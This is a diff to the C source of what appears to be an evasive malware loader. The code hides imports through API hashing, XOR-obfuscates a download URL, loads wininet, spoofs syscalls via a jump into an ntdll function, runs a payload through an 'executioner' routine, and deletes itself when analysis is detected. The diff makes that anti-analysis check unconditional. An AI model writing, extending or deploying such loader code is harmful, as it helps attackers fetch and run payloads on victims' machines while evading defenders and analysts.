@@ -1,6 +1,7 @@
 #include "Common.h"
 #include "ctaes.h"
 #include "IatCamouflage.h"
+#include <stdio.h>
 
 API_HASHING g_Api = { 0 };
 DWORD SyscallId = 0;
@@ -41,6 +42,7 @@ void XorByInputKey(const LPCWSTR szString, LPWSTR szResult, const PBYTE bKey, co
     szResult[wStringSize] = L'\0';
 }
 
+
 int main()
 {
     LPCWSTR szUrl = L"luwr>.,366-2*1-3+qb{hnbf*cjl";
@@ -63,13 +65,11 @@ int main()
     hKernel32 = GetModuleHandleH(KERNEL32DLL_JOAA);
     spoofJump = ((char*)GetProcAddressH(hNtdll, NtAddBootEntry_JOAA)) + 18;
 
-#ifdef ANTIANALYSIS
     if (!AntiAnalysis(20000)) {
         DeleteSelf();
-        ExitProcess(0);
+        ExitProcess(-1);
         return -1;
     }
-#endif
 
     LoadLibraryH("wininet");
 
@@ -118,6 +118,6 @@ int main()
     setup(SyscallId, spoofJump);
     status = executioner(c, 0, NULL);
 
-    ExitProcess(1);
+    ExitProcess(0);
     return 0;
 }
